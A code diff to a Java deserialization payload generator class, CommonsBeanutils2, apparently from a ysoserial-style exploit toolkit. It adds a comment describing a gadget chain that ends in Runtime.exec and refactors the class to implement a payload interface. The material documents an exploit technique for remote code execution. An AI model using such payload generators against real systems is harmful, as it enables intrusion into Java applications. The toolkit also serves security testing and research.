@@ -11,9 +11,19 @@ import java.math.BigInteger;
 import java.util.Comparator;
 import java.util.PriorityQueue;
 
-public class CommonsBeanutils2 {
+/**
+ * 	Gadget chain:
+ * 		ObjectInputStream.readObject()
+ * 			PriorityQueue.readObject()
+ * 				...
+ * 					TransformingComparator.compare()
+ * 						InvokerTransformer.transform()
+ * 							Method.invoke()
+ * 								Runtime.exec()
+ */
+public class CommonsBeanutils2 implements ObjectPayload<Object> {
 
-    public static byte[] getBytes(PayloadType type, String... param) throws Exception {
+    public byte[] getBytes(PayloadType type, String... param) throws Exception {
         final Object templates = Gadgets.createTemplatesImpl(type, param);
         // mock method name until armed
         MyURLClassLoader classLoader = new MyURLClassLoader("commons-beanutils-1.8.2.jar");
@@ -44,5 +54,10 @@ public class CommonsBeanutils2 {
         oos.close();
 
         return bytes;
+    }
+
+    @Override
+    public Object getObject(String command) throws Exception {
+        return null;
     }
 }
